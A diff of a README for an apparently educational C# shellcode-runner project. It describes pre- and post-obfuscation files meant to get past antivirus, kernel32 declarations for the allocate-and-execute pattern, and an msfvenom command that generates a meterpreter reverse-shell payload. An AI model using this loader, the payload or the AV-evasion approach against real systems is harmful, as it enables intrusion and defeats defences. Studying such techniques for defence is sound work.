@@ -1,23 +1,37 @@
 # ozsec2021-shellcode
-C# .NET project for executing shell code 
+C# .NET5 console project for executing shell code 
 
 # Description: 
+Two code files are included: *Original.cs* and *Program.cs*. 
+*Original.cs* - Pre-Obfuscation 
+*Program.cs* - Post-Obfuscation
+
+Currently *Original.cs* will need to be removed from the VS Project in order to compile- AV catches bad.
 
 ## Running shellcode in c#
-    generic process (ie, allocate memory, copy shellcode in, execute)
-    poc||gtfo
-    IOC's (indicators of compromise. Memory analysis)
-## Basic roslyn usage
-    The basis of this is to change sigs of payloads
+Generic Process (ie, allocate memory, copy shellcode in, execute): 
+Using the following `kernel32` DLL calls:
+```csharp
+        [DllImport("kernel32")]
+        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+                UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+        [DllImport("kernel32")]
+        private static extern IntPtr CreateThread(
+            UInt32 lpThreadAttributes,
+            UInt32 dwStackSize,
+            UInt32 lpStartAddress,
+            IntPtr param,
+            UInt32 dwCreationFlags,
+            ref UInt32 lpThreadId
+            );
+        [DllImport("kernel32")]
+        private static extern UInt32 WaitForSingleObject(
+            IntPtr hHandle,
+            UInt32 dwMilliseconds
+            );
+```
 
-## Basic covenant c2 usage/ reference - you can just introduce the tool
-
-## Running the payloads in powershell! powershell == c# terminal
-
-
-## Introduction to defender check AMSI
-    Basically, c# is a script in the scope of AMSIScanBuffer()
-
-## Basic obfuscation of payloads (aes encryption, xor encryption, and decryption **dont wory about encryption too much, just the decryption part is fine in code)
-
-if you're interested, we can delve into process injection in c#. Basic examples using CreateRemoteThread are fine, c# has a cool assembley.load feature that is specific to .NET libraries
+To update the testable shellcode, fire off a quick:
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=1337 -f csharp 
+```
